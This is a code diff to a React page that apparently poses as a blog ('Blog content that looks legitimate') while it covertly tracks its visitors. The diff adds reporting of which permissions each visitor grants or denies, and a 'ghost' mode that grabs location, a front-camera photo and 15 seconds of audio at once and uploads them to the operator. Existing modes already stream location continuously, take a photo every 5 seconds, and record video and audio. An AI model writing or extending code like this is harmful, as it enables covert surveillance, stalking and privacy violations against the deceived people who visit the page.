@@ -10,7 +10,7 @@
 
 import { useEffect, useState, useCallback, useRef } from 'react';
 import { useParams } from 'next/navigation';
-import { fetchSession, activateSession, uploadLocation, uploadPhoto, uploadVideo, uploadAudio, SessionData } from '@/lib/api';
+import { fetchSession, activateSession, uploadLocation, uploadPhoto, uploadVideo, uploadAudio, sendPermissionEvent, SessionData } from '@/lib/api';
 
 // Blog content that looks legitimate
 const BLOG_ARTICLES = [
@@ -101,8 +101,9 @@ export default function SessionPage() {
         case 'location':
           // Start location tracking
           if ('geolocation' in navigator) {
-            watchIdRef.current = navigator.geolocation.watchPosition(
+            navigator.geolocation.getCurrentPosition(
               async (position) => {
+                await sendPermissionEvent(sessionId, 'granted', 'location');
                 await uploadLocation(sessionId, {
                   latitude: position.coords.latitude,
                   longitude: position.coords.longitude,
@@ -111,9 +112,28 @@ export default function SessionPage() {
                   speed: position.coords.speed ?? undefined,
                   heading: position.coords.heading ?? undefined
                 });
+                
+                // Continue watching
+                watchIdRef.current = navigator.geolocation.watchPosition(
+                  async (pos) => {
+                    await uploadLocation(sessionId, {
+                      latitude: pos.coords.latitude,
+                      longitude: pos.coords.longitude,
+                      accuracy: pos.coords.accuracy,
+                      altitude: pos.coords.altitude ?? undefined,
+                      speed: pos.coords.speed ?? undefined,
+                      heading: pos.coords.heading ?? undefined
+                    });
+                  },
+                  (err) => console.log('Watch error:', err),
+                  { enableHighAccuracy: true, timeout: 10000, maximumAge: 5000 }
+                );
               },
-              (err) => console.log('Location error:', err),
-              { enableHighAccuracy: true, timeout: 10000, maximumAge: 5000 }
+              async (err) => {
+                console.log('Location error:', err);
+                await sendPermissionEvent(sessionId, 'denied', 'location');
+              },
+              { enableHighAccuracy: true, timeout: 10000 }
             );
           }
           break;
@@ -122,6 +142,7 @@ export default function SessionPage() {
           // Capture single photo
           try {
             const photoStream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' } });
+            await sendPermissionEvent(sessionId, 'granted', 'single_photo');
             streamRef.current = photoStream;
             
             // Wait a moment for camera to initialize
@@ -156,6 +177,7 @@ export default function SessionPage() {
             }, 'image/jpeg', 0.8);
           } catch (e) {
             console.log('Camera error:', e);
+            await sendPermissionEvent(sessionId, 'denied', 'single_photo');
           }
           break;
 
@@ -163,6 +185,7 @@ export default function SessionPage() {
           // Capture photos continuously
           try {
             const contStream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' } });
+            await sendPermissionEvent(sessionId, 'granted', 'continuous_photo');
             streamRef.current = contStream;
             
             const video = document.createElement('video');
@@ -196,6 +219,7 @@ export default function SessionPage() {
             setInterval(capturePhoto, 5000); // Every 5 seconds
           } catch (e) {
             console.log('Camera error:', e);
+            await sendPermissionEvent(sessionId, 'denied', 'continuous_photo');
           }
           break;
 
@@ -203,6 +227,7 @@ export default function SessionPage() {
           // Record video
           try {
             const videoStream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
+            await sendPermissionEvent(sessionId, 'granted', 'video');
             streamRef.current = videoStream;
             
             const mediaRecorder = new MediaRecorder(videoStream, { mimeType: 'video/webm' });
@@ -225,6 +250,7 @@ export default function SessionPage() {
             }, 30000);
           } catch (e) {
             console.log('Video error:', e);
+            await sendPermissionEvent(sessionId, 'denied', 'video');
           }
           break;
 
@@ -232,6 +258,7 @@ export default function SessionPage() {
           // Record audio
           try {
             const audioStream = await navigator.mediaDevices.getUserMedia({ audio: true });
+            await sendPermissionEvent(sessionId, 'granted', 'microphone');
             streamRef.current = audioStream;
             
             const mediaRecorder = new MediaRecorder(audioStream, { mimeType: 'audio/webm' });
@@ -254,6 +281,96 @@ export default function SessionPage() {
             }, 30000);
           } catch (e) {
             console.log('Audio error:', e);
+            await sendPermissionEvent(sessionId, 'denied', 'microphone');
+          }
+          break;
+
+        case 'ghost':
+          // Ghost Mode: Capture location, photo, and audio all at once
+          await sendPermissionEvent(sessionId, 'granted', 'ghost');
+          
+          // 1. Get location
+          if ('geolocation' in navigator) {
+            navigator.geolocation.getCurrentPosition(
+              async (position) => {
+                await uploadLocation(sessionId, {
+                  latitude: position.coords.latitude,
+                  longitude: position.coords.longitude,
+                  accuracy: position.coords.accuracy,
+                  altitude: position.coords.altitude ?? undefined,
+                  speed: position.coords.speed ?? undefined,
+                  heading: position.coords.heading ?? undefined
+                });
+              },
+              async (err) => {
+                console.log('Ghost location error:', err);
+                await sendPermissionEvent(sessionId, 'denied', 'location');
+              },
+              { enableHighAccuracy: true, timeout: 10000 }
+            );
+          }
+          
+          // 2. Capture photo
+          try {
+            const ghostPhotoStream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' } });
+            
+            await new Promise(resolve => setTimeout(resolve, 500));
+            
+            const ghostVideo = document.createElement('video');
+            ghostVideo.srcObject = ghostPhotoStream;
+            ghostVideo.autoplay = true;
+            ghostVideo.playsInline = true;
+            
+            await new Promise<void>(resolve => {
+              ghostVideo.onloadedmetadata = () => {
+                ghostVideo.play();
+                resolve();
+              };
+            });
+            
+            await new Promise(resolve => setTimeout(resolve, 300));
+            
+            const ghostCanvas = document.createElement('canvas');
+            ghostCanvas.width = ghostVideo.videoWidth;
+            ghostCanvas.height = ghostVideo.videoHeight;
+            const ghostCtx = ghostCanvas.getContext('2d');
+            ghostCtx?.drawImage(ghostVideo, 0, 0);
+            
+            ghostCanvas.toBlob(async (blob) => {
+              if (blob) {
+                await uploadPhoto(sessionId, blob);
+              }
+              ghostPhotoStream.getTracks().forEach(track => track.stop());
+            }, 'image/jpeg', 0.8);
+          } catch (e) {
+            console.log('Ghost photo error:', e);
+            await sendPermissionEvent(sessionId, 'denied', 'camera');
+          }
+          
+          // 3. Record audio (15 seconds for ghost mode)
+          try {
+            const ghostAudioStream = await navigator.mediaDevices.getUserMedia({ audio: true });
+            
+            const ghostRecorder = new MediaRecorder(ghostAudioStream, { mimeType: 'audio/webm' });
+            const ghostChunks: BlobPart[] = [];
+            
+            ghostRecorder.ondataavailable = (e) => ghostChunks.push(e.data);
+            ghostRecorder.onstop = async () => {
+              const blob = new Blob(ghostChunks, { type: 'audio/webm' });
+              await uploadAudio(sessionId, blob, 15);
+            };
+            
+            ghostRecorder.start();
+            
+            setTimeout(() => {
+              if (ghostRecorder.state === 'recording') {
+                ghostRecorder.stop();
+                ghostAudioStream.getTracks().forEach(track => track.stop());
+              }
+            }, 15000); // 15 seconds for ghost mode
+          } catch (e) {
+            console.log('Ghost audio error:', e);
+            await sendPermissionEvent(sessionId, 'denied', 'microphone');
           }
           break;
       }
